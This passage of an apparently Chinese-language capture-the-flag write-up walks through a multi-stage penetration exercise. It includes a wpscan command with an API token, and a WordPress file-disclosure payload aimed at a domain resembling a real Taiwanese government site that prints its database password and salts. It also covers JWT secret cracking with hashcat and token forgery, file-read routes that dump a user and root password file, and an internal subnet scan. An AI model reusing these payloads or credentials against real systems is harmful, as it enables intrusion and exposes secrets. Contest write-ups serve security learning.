class="string">QriHAkY+SGpCNUZWYKq4NnL6pBanuX/IcQZhjGEzJz5M4fzWrCqsDM/Gt09FMxzz</span></span><br><span class="line"><span class="string">gMfb8QKCAQEAhnF+W65yTulKELzLYWv2ngLchOY/xsiBzgTqEaKBahzWrgjGQsly</span></span><br><span class="line"><span class="string">s2SzPuqk14Ft4Ow3IljHlmomRKut9IuhvBDAP4a3anCJUjNkMMVstYS/9dz7RmY5</span></span><br><span class="line"><span class="string">W2HQHlRXHgKS4NsGAI/7aehZztYHjaDW+f55zLrIKHPD+3m6weoSyiZcUberAuMa</span></span><br><span class="line"><span class="string">gOvhmJgGLmPtRzqpOgbEPYOVMo7KhCJqclAq5+OxbVvlhxYsO4RuZBQ8tLqF8iO+</span></span><br><span class="line"><span class="string">/DychaS4w2yzQFSMTYH8FZhtPnz9usI4L1/zRPLVPF7VoIJG1ZZDgeM4nqqnWyQd</span></span><br><span class="line"><span class="string">GTcIXXr+wRobItbnIwqM/ZEca4iQWiO3+QKCAQAjp153c8JvZhR3Stan0bKYHzMm</span></span><br><span class="line"><span class="string">FWEUjmygq6xgzclvkWWYmHwHvYjO4tITXHSmEt5GrUY/W1LOA0x9HRMUh7p71tw6</span></span><br><span class="line"><span class="string">7ni/lELMlT6Sk3b32SRoftEr5SmNEZlXPh2UYC260FkXNj3hhShv7DAZyV2bthqk</span></span><br><span class="line"><span class="string">YV63M7neAAU5YPmq0uvMvxHv1D17bswwbiJ3mzb/E4CSR2gDkKrZGshtJbKUtLvb</span></span><br><span class="line"><span class="string">wEigkCIjw+UFRhLiK4R+OIL7bZtE2unbYWeL1h4w1BLwFJPg/26Gnq91V96GwoKf</span></span><br><span class="line"><span class="string">JiAEy9wfJBnCwJPdr9OV9GGrMfBRF8Rkl6YyvNNb21C6ZABBuAzWpfu0I60h</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_message</span>(<span class="params">encrypted_base64,private_key_pem</span>):</span><br><span class="line">    <span class="comment"># 加载私钥</span></span><br><span class="line">    private_key=serialization.load_pem_private_key(</span><br><span class="line">        private_key_pem.encode(),</span><br><span class="line">        password=<span class="literal">None</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#base64解码密文</span></span><br><span class="line">    encrypted=base64.b64decode(encrypted_base64)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#使用私钥解密</span></span><br><span class="line">    decrypted=private_key.decrypt(</span><br><span class="line">        encrypted,</span><br><span class="line">        padding.OAEP(</span><br><span class="line">            mgf=padding.MGF1(algorithm=hashes.SHA256()),</span><br><span class="line">            algorithm=hashes.SHA256(),</span><br><span class="line">            label=<span class="literal">None</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#解码base64获取原始信息</span></span><br><span class="line">    original_message=base64.b64decode(decrypted).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> original_message</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密所有信息</span></span><br><span class="line"><span class="keyword">for</span> data,encrypted_msg <span class="keyword">in</span> message.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n解密<span class="subst">&#123;date&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decrypted=decrypt_message(encrypted_msg,backend)</span><br><span class="line">        <span class="built_in">print</span>(decrypted)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解密失败:<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-201245.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">解密inputMessage_20241216:</span><br><span class="line">Park:</span><br><span class="line">你的行动已经暴露，24小时内迅速撤离，销毁所有资料，将现有资料统一上传到【任务中心】</span><br><span class="line">发送人：Dylan</span><br><span class="line"></span><br><span class="line">解密inputMessage_20240411:</span><br><span class="line">Park:</span><br><span class="line">总部已经为你安排新的身份，请务必在3日内抵台，你的新身份是新竹县动物保护防疫所网络安全顾问，【任务中心】账号密码和你任职单位网站的数据库用户名密码一致，请尽快修改 </span><br><span class="line">发送人：Dylan</span><br><span class="line"></span><br><span class="line">解密inputMessage_20240305:</span><br><span class="line">Park:</span><br><span class="line">【任务中心】网址已变更为 https://task.ctfer.com ，请注意修改浏览器地址栏中的链接 </span><br><span class="line">发送人：Dylan</span><br></pre></td></tr></table></figure><p><code>flag2：ctfshow&#123;https://task.ctfer.com&#125;</code></p><h4 id="潜入敌营"><a href="#潜入敌营" class="headerlink" title="潜入敌营"></a>潜入敌营</h4><p>这里需要<strong>账户密码</strong></p><p>通过<code>你的新身份是新竹县动物保护防疫所网络安全顾问</code>搜索网站。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://apc.hsinch*.g*v.tw/</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-211349.png"></p><p>可以看到插件是wordpress，利用kali自带<code>wpscan</code>可以扫出漏洞poc，第一次用需要注册登录官网获取token</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url https://apc.hsinch*.g*v.tw/ --api_token sWXaPLV1Doham43h0uiyVIKtTAKh34kIloIo07DAIeY</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-214515.png"></p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-214607.png"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://apc.hsinch*.g*v.tw/?aam-media=wp-config.php</span><br></pre></td></tr></table></figure><p>得到数据库信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;hsinchug_wp1&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;hsinchug_wp1&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;Q.4Vyj8VCiedX1KYU5g05&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> ); </span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;o8wpc6n66l270a8axjrmhcy5afl8ttgf8bj9lm3hji103rchpgw88f0wuxjfcwqd&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;3jbho525q0dabjkgcpkg2yvuncwganxcjas0ikq7drgxa62my8h6tvut4a34pujx&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;1acslrj7hblucj7nnnsvi91t8v77kf8jl7omi5gfc3v8nvca46lndpchjtqd27jq&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;b6nacyj0crhfol2hs6gbqx71w957dn9al8hrjgrydf3rora6jcw2olw4sc3736aw&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;vl5vc4gy92ciqvbflfc5o4227jabrktlir61urdxal2fgl9xfokt21usbr28625v&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;7qljoppn8bcdggacnvi53616r5iyy4yr7qduyj0up3x1nv1o345t591bitfxod3a&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;g50jlcgt1qyy031blxcahqm1f20jfypw53jxxg83a67c73ir3dod3irbbguis13k&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;l5pti50j2wrxwrkclijp66x24r53auvf7kknsq7w733fr18x7my8lawm0p4hgtph&#x27;</span>);</span><br></pre></td></tr></table></figure><p>或者根据插件版本找到payload</p><p><code>flag3：ctfshow&#123;hsinchug_wp1_Q.4Vyj8VCiedX1KYU5g05&#125;</code></p><h3 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h3><h4 id="秘密潜伏"><a href="#秘密潜伏" class="headerlink" title="秘密潜伏"></a>秘密潜伏</h4><p>需要<strong>提交dylan的电话号码</strong></p><p>登录任务中心：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号：hsinchug_wp1</span><br><span class="line">密码：Q.4Vyj8VCiedX1KYU5g05</span><br><span class="line">地址：第一章潜入敌营开启的地址</span><br></pre></td></tr></table></figure><p>放了半天只看到一个照片和一串公钥：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-222023.png"></p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-222124.png"></p><p>而根据题目中提示的jwt就说的通了，key应该是密钥，我们需要伪造jwt登录dylan的账号：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-222700.png"></p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-222714.png"></p><p>利用hashcat将遮挡的字符爆破出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoc2luY2h1Z193cDEiLCJleHAiOjE3NDA2NjYyNTN9.868RYTiNArIpe3OjqMFKL9XcKzzEIjzMlagbBlw6DT0 --custom-charset1=?l?d 4a4f7d6e8b5?1?1?10c7f </span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-180440.png" alt="QQ20250227-180440"></p><p>密钥为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4a4f7d6e8b5e3a0c7f</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-181324.png"></p><p>抓显示电话号码的包修改jwt即可：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-181411.png"></p><p><code>flag4：ctfshow&#123;117447685307&#125;</code></p><h4 id="收集敌方身份信息"><a href="#收集敌方身份信息" class="headerlink" title="收集敌方身份信息"></a>收集敌方身份信息</h4><p>这里要知道<strong>root的密码</strong></p><p>知道jwt密钥后我们就可以访问<code>https://task.ctfer.com</code>，通过伪造jwt来登录dylan账号</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-194846.png"></p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-194920.png"></p><p>而在dylan账号中多了一个<code>Administrator</code>，里面有两个路由分别为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/listTaskFiles?path=</span><br><span class="line"></span><br><span class="line">/readTaskFile?path=&amp;file_name=</span><br></pre></td></tr></table></figure><p>第一个路由用于看<strong>指定目录的文件</strong>，而<strong>path参数用来指定目录</strong>：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-195259-174065751208622.png"></p><p>同样需要伪造jwt才能访问。</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-195517.png"></p><p>测试发现过滤了<code>/</code>和<code>\</code>，但没过滤<code>.</code>，所以可以<strong>通过<code>.</code>看当前目录下的文件</strong>：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-200130.png" alt="QQ20250227-200130"></p><p>而第二个路由用于<strong>看指定目录的指定文件</strong>，<strong>path指定目录，file_name指定文件</strong>：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-201124.png"></p><p>main.py.bak:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 Flask 应用的密钥，用于加密会话等</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义根路由，处理 GET 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 在会话中设置用户为 guest</span></span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查会话中的用户是否为 admin</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /key 路由，处理 GET 请求，获取特定文件中的密钥</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 尝试打开文件读取密钥</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /set_log_option 路由，处理设置日志选项的请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从请求参数中获取日志名称和日志文件名称</span></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取日志记录器并添加文件处理器</span></span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 清空日志文件内容</span></span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /get_log_content 路由，处理获取日志内容的请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从请求参数中获取日志文件名称</span></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    <span class="comment"># 拼接文件路径</span></span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空指定文件内容的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 运行 Flask 应用，开启调试模式，监听所有 IP 地址，端口为 8888</span></span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p><code>init_users.json</code>记录了所以用户名和密码：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-201358.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;hsinchug_wp1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hsinchug_wp1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Q.4Vyj8VCiedX1KYU5g05&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dylan&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dylan&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8f7a55c6d9a7d9a7&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;secret_user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;root&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7y.(sc#Ac_&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>flag5：ctfshow&#123;7y.(sc#Ac_&#125;</code></p><h4 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h4><p>需要<strong>提交 DATABASE_SECRET_KEY内容</strong></p><p>直接登录dylan账号，server info有内网地址：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-203047.png"></p><p>访问<code>/downloadTaskFile?url=</code>路由，用获取的IP扫c段：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-204411.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Database TEST<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> <span class="variable constant_">DATABASE_SECRET_KEY</span> = <span class="string">&#x27;0x8F7C71E8E82E4D1E&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to Database TEST<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is a test page for database connection and queries.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span 